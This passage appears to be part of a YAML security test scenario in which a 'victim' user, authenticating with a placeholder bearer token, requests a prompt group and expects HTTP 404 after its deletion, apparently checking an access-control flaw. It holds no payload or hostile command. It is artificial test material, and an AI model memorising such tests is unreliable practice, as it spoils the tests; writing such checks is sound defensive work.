          url: "{{ context.environment.target_base_url.value }}/api/prompts/groups/{{ context.resources.victim_prompt.identifier }}"
          headers:
            # Use victim's authentication placeholder
            Authorization: "Bearer {{ context.users.victim_user.credentials.bearer_token }}"
            Accept: "application/json"

    - step: 2
      dsl: "Then the request should fail, indicating the prompt is gone (e.g., HTTP 404 Not Found)"
      check:
        type: http_response_status
        # Asserting the expected failure state for the victim trying to access deleted resource
        expected_status: 404

```